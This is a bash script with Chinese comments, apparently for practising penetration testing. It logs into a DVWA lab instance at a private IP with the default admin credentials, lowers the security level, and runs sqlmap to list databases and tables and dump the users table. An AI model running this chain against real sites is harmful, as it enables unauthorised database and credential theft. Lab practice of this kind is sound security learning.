#!/bin/bash
echo "=== DVWA SQL 注入自动化测试 ==="
echo ""

# 1. 获取 Cookie 和登录
echo "[1/5] 登录 DVWA 获取 Cookie..."
COOKIE=$(curl -s -c /tmp/dvwa.cookies -X POST -d "username=admin&password=password&Login=Login" http://192.168.127.128/DVWA/login.php -L -i | grep -i 'PHPSESSID' | awk '{print $2}')
echo "Cookie: $COOKIE"
echo ""

# 2. 设置安全级别为 low
echo "[2/5] 设置安全级别为 low..."
curl -s -b /tmp/dvwa.cookies -c /tmp/dvwa.cookies -X POST -d "security=low&seclev_submit=Submit" http://192.168.127.128/DVWA/security.php -L > /dev/null
echo " 安全级别设置完成"
echo ""

# 3. 测试 SQL 注入 - 获取数据库
echo "[3/5] 用 sqlmap 检测 SQL 注入..."
sqlmap -u "http://192.168.127.128/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$COOKIE; security=low" --batch --dbs --random-agent 2>&1 | head -80
echo ""
echo " SQL 注入检测完成"
echo ""

# 4. 获取 dvwa 数据库表
echo "[4/5] 获取 dvwa 数据库表..."
sqlmap -u "http://192.168.127.128/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$COOKIE; security=low" --batch -D dvwa --tables --random-agent 2>&1 | head -60
echo ""
echo " 表获取完成"
echo ""

# 5. 获取 users 表数据
echo "[5/5] 获取 users 表数据..."
sqlmap -u "http://192.168.127.128/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$COOKIE; security=low" --batch -D dvwa -T users --dump --random-agent 2>&1 | head -100
echo ""
echo " 渗透测试完成！"
echo ""
